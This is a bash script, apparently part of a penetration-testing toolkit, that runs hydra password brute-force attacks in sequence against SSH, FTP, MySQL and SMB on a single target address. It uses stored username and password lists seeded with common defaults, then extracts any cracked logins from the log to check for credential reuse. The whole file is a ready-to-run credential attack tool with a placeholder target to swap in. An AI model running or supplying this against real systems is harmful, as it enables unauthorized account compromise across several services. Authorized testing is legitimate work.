#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# COMBINATION: NETWORK SERVICES STACK
# Tests SSH, FTP, MySQL, SMB with credential reuse detection
# ═══════════════════════════════════════════════════════════════════

TARGET="192.168.1.100"  # <-- CHANGE THIS TO YOUR TARGET

# ═══════════════════════════════════════════════════════════════════

set -euo pipefail  # Enterprise error handling

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source utilities
source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

# Configuration
OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$OUTPUT_DIR/combo_network_stack_${TARGET//[.:\/]/_}_$(date +%Y%m%d_%H%M%S).log"

echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  COMBINATION ATTACK: NETWORK SERVICES STACK" | tee -a "$LOG_FILE"
echo "  Target: $TARGET" | tee -a "$LOG_FILE"
echo "  Testing: SSH + FTP + MySQL + SMB" | tee -a "$LOG_FILE"
echo "  Scenario: Credential Reuse Detection" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

[ ! -f "$USERLIST" ] && echo -e "root\nadmin\nuser" > "$USERLIST"
[ ! -f "$PASSLIST" ] && echo -e "password\nadmin\n123456" > "$PASSLIST"

# Phase 1: SSH
echo "━━━ Phase 1: SSH (Port 22) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f ssh://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 2: FTP
echo "━━━ Phase 2: FTP (Port 21) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 8 -f ftp://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 3: MySQL
echo "━━━ Phase 3: MySQL (Port 3306) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f mysql://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 4: SMB
echo "━━━ Phase 4: SMB (Port 445) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f smb://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Summary
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  NETWORK STACK ATTACK COMPLETE" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"

# Analyze credential reuse
if grep -q "login:" "$LOG_FILE"; then
    echo "" | tee -a "$LOG_FILE"
    echo "[+] CREDENTIALS FOUND (Check for reuse):" | tee -a "$LOG_FILE"
    grep "login:" "$LOG_FILE" | tee -a "$LOG_FILE"
fi

exit 0
